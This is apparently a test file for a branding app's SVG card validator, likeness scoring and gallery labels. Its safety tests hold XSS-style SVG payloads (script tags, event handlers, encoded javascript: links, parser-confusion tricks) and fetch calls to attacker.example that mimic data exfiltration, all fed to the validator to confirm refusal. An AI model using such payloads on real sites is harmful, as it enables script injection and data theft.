/**
 * The laws under a company's own card designs (2026-11-16): what a design may contain
 * (card-safety.js), how alike two layouts are (card-likeness.js), and the words the CARDS gallery
 * says (card-gallery-view.js). Pure functions over real templates; nothing mocked.
 */
import fs from 'fs';
import path from 'path';
import { describe, expect, test } from 'vitest';
import { designRefusals, specRefusals } from '../../backend/services/branding/card-safety.js';
import { layoutLikeness, TOO_ALIKE } from '../../backend/services/branding/card-likeness.js';
import { templatesDir } from '../../backend/services/branding/brand-tokens.js';
import { cardStanding, gallerySummary, newCardNameRefusal } from '../../frontend/app/RelinkShell/brandkits/card-gallery-view.js';

const shipped = fs.readdirSync(templatesDir()).filter((f) => f.endsWith('.svg'))
  .map((f) => [f, fs.readFileSync(path.join(templatesDir(), f), 'utf8')]);

describe('card-safety — a design draws, and does nothing else', () => {
  test('every shipped template passes, so the law fits what cards really are', () => {
    expect(shipped.length).toBeGreaterThan(5);
    for (const [file, svg] of shipped) expect(designRefusals(svg), file).toEqual([]);
  });

  test.each([
    ['a script', '<svg><script>alert(1)</script></svg>', '<script>'],
    ['an event handler', '<svg><rect onclick="alert(1)"/></svg>', 'onclick='],
    ['a javascript: link', '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>', 'javascript:'],
    ['an encoded javascript: link', '<svg><image href="&#106;avascript:alert(1)"/></svg>', 'javascript:'],
    ['an outside file', '<svg><use href="https://example.com/a.svg#x"/></svg>', 'reaches outside'],
    ['an SVG smuggled into <use>', '<svg><use href="data:image/svg+xml;base64,PHN2Zz4="/></svg>', 'reaches outside'],
    ['an @import', '<svg><style>@import url(https://example.com/a.css);</style></svg>', '@import'],
    ['a CSS url() out', '<svg><rect style="fill:url(https://example.com/x)"/></svg>', 'url(https://example.com/x)'],
    ['HTML inside', '<svg><foreignObject><div>x</div></foreignObject></svg>', '<foreignObject>'],
    ['an animation that sets a link', '<svg><set attributeName="href" to="#x"/></svg>', '<set>'],
    ['a doctype', '<!DOCTYPE svg [<!ENTITY x "y">]><svg/>', 'starts with <svg>'],
  ])('%s is refused by name', (_, svg, named) => {
    expect(designRefusals(svg).join(' | ')).toContain(named);
  });

  test.each([
    ['an HTML-short comment', '<svg><!--><img src=x onerror="fetch(\'https://attacker.example\')">--></svg>'],
    ['a greater-than sign inside a quoted attribute', '<svg><image width=">" href="#x" onerror="fetch(\'https://attacker.example\')"/></svg>', 'onerror='],
    ['an unquoted external href', '<svg><image href=https://attacker.example/exfil?d=secret /></svg>'],
    ['a mismatched XML close', '<svg><text>open</rect></svg>'],
  ])('PR20 H-01: %s cannot cross the XML boundary', (_, svg, named) => {
    const refusals = designRefusals(svg);
    expect(refusals.length).toBeGreaterThan(0);
    if (named) expect(refusals.join(' | ')).toContain(named);
  });

  test('copy that merely reads like code is copy', () => {
    expect(designRefusals('<svg><text x="1" y="2">online = fast, onboard = easy</text></svg>')).toEqual([]);
  });

  test('the fields are data: names, and a whole number of characters', () => {
    expect(specRefusals({ fields: { headline: { required: true, max: 40 } } })).toEqual([]);
    expect(specRefusals({})).toHaveLength(1);
    expect(specRefusals({ fields: { 'bad name': {}, ok: { max: 0 } } })).toHaveLength(2);
  });
});

describe('card-likeness — the drawing, not the paint', () => {
  const stat = shipped.find(([f]) => f === 'stat.svg')[1];
  const launch = shipped.find(([f]) => f === 'launch.svg')[1];

  test('a recolour is the same drawing; two different cards are not', () => {
    expect(layoutLikeness(stat, stat)).toBe(1);
    expect(layoutLikeness(stat, stat.replaceAll('{{token.accent}}', '{{token.rise}}'))).toBe(1);
    expect(layoutLikeness(stat, launch)).toBeLessThan(TOO_ALIKE);
  });

  test('moving the shapes moves the likeness down', () => {
    const moved = stat.replace(/ y="(\d+)"/g, (_, y) => ` y="${Number(y) + 37}"`);
    expect(layoutLikeness(stat, moved)).toBeLessThan(TOO_ALIKE);
  });
});

describe('the CARDS gallery says what each card is', () => {
  test('shared, own, too alike, and its own type', () => {
    expect(cardStanding({ name: 'stat', source: 'shared', likeness: [{ brand: 'umbrae', score: 1 }] }, 'Northwind'))
      .toMatchObject({ tone: 'shared', label: 'SHARED LAYOUT' });
    expect(cardStanding({ name: 'stat', title: 'Stat row', source: 'company', likeness: [{ brand: 'umbrae', score: 0.91 }] }, 'Northwind'))
      .toMatchObject({ tone: 'alike', label: 'OWN · 91% LIKE UMBRAE' });
    expect(cardStanding({ name: 'stat', source: 'company', likeness: [] }, 'Northwind').label).toBe('OWN DESIGN');
    expect(cardStanding({ name: 'pool', source: 'company', ownType: true, likeness: [] }, 'Northwind').label).toBe("NORTHWIND'S OWN CARD TYPE");
  });

  test('the summary counts what is still the shared look', () => {
    const gallery = { shared: 9, own: 2, cards: [
      ...Array.from({ length: 9 }, (_, i) => ({ name: `s${i}`, source: 'shared', likeness: [] })),
      { name: 'a', source: 'company', likeness: [{ brand: 'umbrae', score: 0.8 }] },
      { name: 'b', source: 'company', likeness: [] },
    ] };
    expect(gallerySummary(gallery, 'Northwind')).toBe("9 of 11 cards are still the shared layout other companies draw too · 1 of NORTHWIND's own still looks like another company's. Open one to make it NORTHWIND's.");
    expect(gallerySummary({ shared: 0, own: 1, cards: [{ name: 'b', source: 'company', likeness: [] }] }, 'Northwind')).toBe("Every one of NORTHWIND's 1 cards is its own design.");
  });

  test('a new card type is named the way the server takes it', () => {
    expect(newCardNameRefusal('Pool Spotlight', { cards: [] })).toContain('lowercase');
    expect(newCardNameRefusal('stat', { cards: [{ name: 'stat' }] })).toContain('already');
    expect(newCardNameRefusal('pool-spotlight', { cards: [] })).toBe(null);
  });
});
